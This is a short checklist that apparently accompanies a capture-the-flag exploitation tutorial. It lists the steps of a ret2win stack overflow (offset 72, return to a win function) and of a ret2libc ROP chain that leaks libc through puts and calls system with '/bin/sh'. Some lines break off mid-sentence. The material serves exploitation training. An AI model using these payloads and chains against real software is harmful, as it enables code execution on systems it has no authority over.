# Worked examples â€” the numbers — checklist

Companion to `worked-examples.md`.

## Checklist

- [ ] `pwn_triage ./chal` â†’ NX on, no canary, no PIE, `win()` at 0x4011a3.
- [ ] `pwn_cyclic 100` â†’ send â†’ crash, RIP = 0x6161616b.
- [ ] `pwn_cyclic --find 0x6161616b` â†’ offset 72.
- [ ] Payload: `b'A'*72 + p64(0x4011a3)` â†’ send â†’ flag printed.
- [ ] `pwn_triage` â†’ NX on, PIE, partial RELRO, canary absent.
- [ ] Leak: `puts@plt(puts@got)` â†’ libc base from the printed address minus
- [ ] chain1: `pad + pop rdi;ret + puts_got + puts_plt + main_plt` â€” leaks
- [ ] chain2: `pad + pop rdi;ret + binsh_in_libc + system_addr + exit_addr`.
